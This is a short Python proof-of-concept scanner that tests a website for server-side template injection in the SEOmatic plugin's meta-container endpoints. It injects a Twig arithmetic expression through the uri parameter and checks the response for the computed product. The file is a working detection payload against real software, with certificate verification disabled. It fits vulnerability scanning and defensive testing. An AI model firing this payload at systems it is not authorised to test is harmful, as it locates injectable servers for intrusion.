import requests,re,urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
def randomInt(s,e):
	import random
	key=random.randint(int(s),int(e))
	return key
r1=randomInt(40000, 44800)
def randomInt(s,e):
	import random
	key=random.randint(int(s),int(e))
	return key
r2=randomInt(40000, 44800)
def scan(baseurl):
	if baseurl[-1]=='/':
		baseurl=baseurl
	else:
		baseurl=baseurl+"/"
	url=baseurl+"actions/seomatic/meta-container/meta-link-container/?uri={{"+str(r1)+"*'"+str(r2)+"'}}"
	headers={"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:105.0) Gecko/20100101 Firefox/105.0"}
	response=requests.get(url,headers=headers,timeout=5,verify=False)
	if response.status_code == 200 and "MetaLinkContainer" in response.text and "canonical" in response.text and str(r1 * r2) in response.text:
		poc10=True
	else:
		poc10=False
	url=baseurl+"actions/seomatic/meta-container/all-meta-containers?uri={{"+str(r1)+"*'"+str(r2)+"'}}"
	headers={"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:105.0) Gecko/20100101 Firefox/105.0"}
	response=requests.get(url,headers=headers,timeout=5,verify=False)
	if response.status_code == 200 and "MetaLinkContainer" in response.text and "canonical" in response.text and str(r1 * r2) in response.text:
		poc20=True
	else:
		poc20=False
	if poc10 or poc20:
		return True
	else:
		return False
